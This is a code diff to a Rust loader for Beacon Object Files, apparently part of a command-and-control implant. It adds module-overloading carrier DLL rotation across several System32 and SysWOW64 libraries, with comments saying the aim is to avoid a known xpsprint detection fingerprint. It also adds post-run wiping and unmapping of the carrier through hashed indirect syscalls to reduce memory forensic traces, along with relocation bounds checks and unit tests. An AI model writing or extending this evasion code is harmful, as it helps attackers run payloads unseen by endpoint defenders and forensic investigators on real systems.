@@ -156,9 +156,8 @@ impl BofLoader {
     /// 执行 x64 BOF（同步；由 execute 外包 stack spoof）
     fn execute_x64_sync(coff_data: &[u8], args: &[u8], header: &CoffFileHeader) -> BofResult<String> {
         unsafe {
-            // 1. 实现 True Module Overloading: 挑选载体 DLL
-            let carrier_dll = "\\??\\C:\\Windows\\System32\\xpsprint.dll";
-            let base_addr = Self::module_overload_map(carrier_dll)?;
+            // 1. True Module Overloading: rotate carrier DLLs (avoid single known xpsprint fingerprint)
+            let base_addr = Self::map_rotated_carrier(false)?;
 
             debug!("[+] Carrier DLL mapped at: 0x{:X}", base_addr);
 
@@ -331,8 +330,45 @@ impl BofLoader {
                 go(args.as_ptr(), args.len() as i32);
             }
 
-            Ok(beacon_api::get_bof_output())
+            let out = beacon_api::get_bof_output();
+
+            // Unmap / zero carrier after BOF (reduce VAD footprint)
+            Self::release_carrier_mapping(base_addr);
+
+            Ok(out)
         }
+    }
+
+    /// Best-effort: wipe and unmap carrier view after BOF execution.
+    unsafe fn release_carrier_mapping(base_addr: usize) {
+        if base_addr == 0 {
+            return;
+        }
+        // Zero first page headers to reduce PE signature residue
+        let wipe = std::slice::from_raw_parts_mut(base_addr as *mut u8, 0x1000.min(4096));
+        for b in wipe.iter_mut() {
+            *b = 0;
+        }
+        let mut base = base_addr;
+        let mut size: usize = 0;
+        let _ = crate::syscalls::indirect_syscall(
+            crate::stealth::hash_api_name(b"NtUnmapViewOfSection"),
+            &[
+                0xFFFFFFFFFFFFFFFFu64 as usize, // NtCurrentProcess
+                base,
+            ],
+        );
+        // Fallback: free if unmap unavailable
+        let _ = crate::syscalls::indirect_syscall(
+            crate::stealth::hash_api_name(b"NtFreeVirtualMemory"),
+            &[
+                0xFFFFFFFFFFFFFFFFu64 as usize,
+                &mut base as *mut _ as usize,
+                &mut size as *mut _ as usize,
+                0x8000, // MEM_RELEASE
+            ],
+        );
+        let _ = size;
     }
 
     /// 执行 x86 BOF (32位)
@@ -347,9 +383,8 @@ impl BofLoader {
             let coff_data = _coff_data;
             let args = _args;
             let header = _header;
-            // 1. 实现 Module Overloading: 挑选载体 DLL (32位版本)
-            let carrier_dll = "\\??\\C:\\Windows\\SysWOW64\\xpsprint.dll";
-            let base_addr = Self::module_overload_map(carrier_dll)?;
+            // 1. Module Overloading: rotate carrier DLLs (WOW64 path)
+            let base_addr = Self::map_rotated_carrier(true)?;
 
             debug!("[+] Carrier DLL mapped at: 0x{:X}", base_addr);
 
@@ -578,6 +613,58 @@ impl BofLoader {
         Ok(base_addr)
     }
 
+    /// Candidate carrier DLLs for module overloading (less single-signature than xpsprint alone).
+    fn carrier_candidates(wow64: bool) -> &'static [&'static str] {
+        if wow64 {
+            &[
+                "\\??\\C:\\Windows\\SysWOW64\\version.dll",
+                "\\??\\C:\\Windows\\SysWOW64\\dbghelp.dll",
+                "\\??\\C:\\Windows\\SysWOW64\\wer.dll",
+                "\\??\\C:\\Windows\\SysWOW64\\netapi32.dll",
+                "\\??\\C:\\Windows\\SysWOW64\\xpsprint.dll",
+            ]
+        } else {
+            &[
+                "\\??\\C:\\Windows\\System32\\version.dll",
+                "\\??\\C:\\Windows\\System32\\dbghelp.dll",
+                "\\??\\C:\\Windows\\System32\\wer.dll",
+                "\\??\\C:\\Windows\\System32\\netapi32.dll",
+                "\\??\\C:\\Windows\\System32\\xpsprint.dll",
+            ]
+        }
+    }
+
+    /// Map a randomly rotated carrier DLL; try next candidates on failure.
+    fn map_rotated_carrier(wow64: bool) -> BofResult<usize> {
+        let list = Self::carrier_candidates(wow64);
+        if list.is_empty() {
+            return Err(BofError::MemoryAllocationFailed(
+                "no carrier DLL candidates".to_string(),
+            ));
+        }
+        let start = crate::utils::random_range(0, (list.len() - 1) as u32) as usize;
+        let mut last_err = BofError::MemoryAllocationFailed("carrier map failed".to_string());
+        for i in 0..list.len() {
+            let path = list[(start + i) % list.len()];
+            match unsafe { Self::module_overload_map(path) } {
+                Ok(base) => {
+                    debug!("[+] Carrier DLL mapped: {} @ 0x{:X}", path, base);
+                    return Ok(base);
+                }
+                Err(e) => {
+                    last_err = e;
+                }
+            }
+        }
+        Err(last_err)
+    }
+
+    /// Pure helper: validate reloc symbol index against symbol table length.
+    #[inline]
+    pub fn reloc_symbol_index_in_bounds(index: u32, symbol_count: usize) -> bool {
+        (index as usize) < symbol_count
+    }
+
     /// 核心符号修复逻辑 (Symbol Patching) - x64 版本
     unsafe fn patch_symbols(
         section_base: *mut u8,
@@ -587,7 +674,16 @@ impl BofLoader {
         section_map: &std::collections::HashMap<u16, usize>,
     ) {
         for reloc in relocs {
-            let symbol = &symbols[reloc.symbol_table_index as usize];
+            let idx = reloc.symbol_table_index as usize;
+            if idx >= symbols.len() {
+                warn!(
+                    "[!] BOF reloc symbol_table_index {} out of bounds (len={})",
+                    idx,
+                    symbols.len()
+                );
+                continue;
+            }
+            let symbol = &symbols[idx];
             let name = Self::get_symbol_name(symbol, string_table);
 
             let target_addr = if symbol.section_number > 0 {
@@ -641,7 +737,16 @@ impl BofLoader {
         section_map: &std::collections::HashMap<u16, usize>,
     ) {
         for reloc in relocs {
-            let symbol = &symbols[reloc.symbol_table_index as usize];
+            let idx = reloc.symbol_table_index as usize;
+            if idx >= symbols.len() {
+                warn!(
+                    "[!] BOF x86 reloc symbol_table_index {} out of bounds (len={})",
+                    idx,
+                    symbols.len()
+                );
+                continue;
+            }
+            let symbol = &symbols[idx];
             let name = Self::get_symbol_name(symbol, string_table);
 
             let target_addr = if symbol.section_number > 0 {
@@ -838,5 +943,28 @@ impl BofLoader {
         } else {
             String::from_utf8_lossy(&sym.name).trim_matches('\0').to_string()
         }
+    }
+}
+
+#[cfg(test)]
+mod reloc_bounds_tests {
+    use super::BofLoader;
+
+    #[test]
+    fn symbol_index_bounds_helper() {
+        assert!(BofLoader::reloc_symbol_index_in_bounds(0, 1));
+        assert!(BofLoader::reloc_symbol_index_in_bounds(2, 3));
+        assert!(!BofLoader::reloc_symbol_index_in_bounds(3, 3));
+        assert!(!BofLoader::reloc_symbol_index_in_bounds(0, 0));
+        assert!(!BofLoader::reloc_symbol_index_in_bounds(u32::MAX, 1));
+    }
+
+    #[test]
+    fn carrier_list_not_only_xpsprint() {
+        let cands = BofLoader::carrier_candidates(false);
+        assert!(cands.len() >= 3);
+        assert!(cands.iter().any(|p| p.contains("version.dll")));
+        // xpsprint may remain as last-resort fallback but must not be the only option
+        assert!(cands.iter().any(|p| !p.contains("xpsprint")));
     }
 }
